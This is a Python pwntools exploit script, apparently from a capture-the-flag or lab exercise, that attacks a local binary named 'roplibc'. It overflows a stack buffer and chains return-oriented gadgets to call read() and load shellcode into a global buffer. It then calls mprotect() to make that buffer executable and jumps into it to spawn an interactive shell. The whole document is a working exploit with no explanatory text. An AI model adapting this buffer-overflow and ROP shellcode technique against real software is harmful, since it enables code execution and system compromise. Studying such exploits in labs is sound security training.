#!/usr/bin/env python3
from mmap import PAGESIZE, PROT_EXEC, PROT_READ
from pwn import *

BIN = "./roplibc"
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
context.binary = BIN

elf = ELF(BIN)
rop = ROP(BIN)
libc_rop = ROP(LIBC)
libc = ELF(LIBC)
libc.address = 0x7ffff7db8000

# Static analysis
buf_offset = 0x48

# Gadgets
pop_rdi = rop.find_gadget(['pop rdi'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi'])[0]
# pop_rdx = libc.address + libc_rop.find_gadget(['pop rdx'])[0]
pop_rax_rdx_r12 = libc.address + 0x11c36d

gbuf_addr = elf.symbols['gbuf']

payload = b"A" * buf_offset
sc = asm(shellcraft.sh())

# read(0, gbuf, len(sc))
payload += p64(pop_rdi) + p64(0) +\
	p64(pop_rsi_r15) + p64(gbuf_addr) + p64(0) +\
	p64(pop_rax_rdx_r12) + p64(0) + p64(len(sc)) + p64(0) +\
	p64(libc.symbols['read'])

# mprotect(pg_gbuf, PAGESIZE, PROT_READ | PROT_EXEC)
payload += p64(pop_rdi) + p64(gbuf_addr & 0xfffffffffffff000) +\
	p64(pop_rsi_r15) + p64(PAGESIZE) + p64(0) +\
	p64(pop_rax_rdx_r12) + p64(0) + p64(PROT_READ | PROT_EXEC) + p64(0) +\
	p64(libc.symbols['mprotect']) +\
	p64(gbuf_addr)

io = process(BIN)
io.sendline(payload)
io.sendline(sc)

io.interactive()
